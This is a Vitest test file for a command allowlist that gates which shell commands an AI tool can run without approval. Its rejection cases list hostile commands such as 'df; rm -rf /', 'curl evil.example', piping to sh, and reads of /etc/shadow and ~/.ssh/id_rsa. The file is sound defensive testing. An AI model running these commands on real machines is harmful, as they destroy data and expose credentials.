import { describe, expect, it } from "vitest";
import { isReadOnlyCommand } from "../../ai/tools/command-allowlist.js";

/**
 * These commands can run without a per-command approval click, so the parser
 * has to refuse anything that could become a second command. Substring
 * matching would pass "df; rm -rf /", which is the whole reason this is
 * argv-based.
 */
describe("isReadOnlyCommand", () => {
  it("allows plain diagnostics", () => {
    for (const command of [
      "df -h",
      "uptime",
      "free -m",
      "whoami",
      "ps aux",
      "lsblk",
      "uname -a",
      "/usr/bin/df -h",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(true);
    }
  });

  it("rejects command chaining and redirection", () => {
    for (const command of [
      "df; rm -rf /",
      "df && curl evil.example",
      "df || reboot",
      "df | sh",
      "df > /etc/passwd",
      "df >> /etc/passwd",
      "cat < /etc/shadow",
      "echo `whoami`",
      "echo $(id)",
      "df\nrm -rf /",
      "df \\\n rm",
    ]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("rejects privilege escalation", () => {
    for (const command of ["sudo df -h", "su root", "doas df", "env df"]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("rejects commands that are not on the list", () => {
    for (const command of ["rm -rf /", "curl evil.example", "vi /etc/passwd"]) {
      expect(isReadOnlyCommand(command).allowed, command).toBe(false);
    }
  });

  it("limits systemctl and docker to read-only subcommands", () => {
    expect(isReadOnlyCommand("systemctl status nginx").allowed).toBe(true);
    expect(isReadOnlyCommand("systemctl restart nginx").allowed).toBe(false);
    expect(isReadOnlyCommand("systemctl stop nginx").allowed).toBe(false);

    expect(isReadOnlyCommand("docker ps").allowed).toBe(true);
    expect(isReadOnlyCommand("docker stats --no-stream").allowed).toBe(true);
    expect(isReadOnlyCommand("docker rm -f web").allowed).toBe(false);
    expect(isReadOnlyCommand("docker exec -it web sh").allowed).toBe(false);
  });

  it("limits cat to safe paths", () => {
    expect(isReadOnlyCommand("cat /proc/meminfo").allowed).toBe(true);
    expect(isReadOnlyCommand("cat /etc/os-release").allowed).toBe(true);
    expect(isReadOnlyCommand("cat /etc/shadow").allowed).toBe(false);
    expect(isReadOnlyCommand("cat ~/.ssh/id_rsa").allowed).toBe(false);
    expect(isReadOnlyCommand("cat").allowed).toBe(false);
  });

  it("rejects an empty command", () => {
    expect(isReadOnlyCommand("").allowed).toBe(false);
    expect(isReadOnlyCommand("   ").allowed).toBe(false);
  });
});
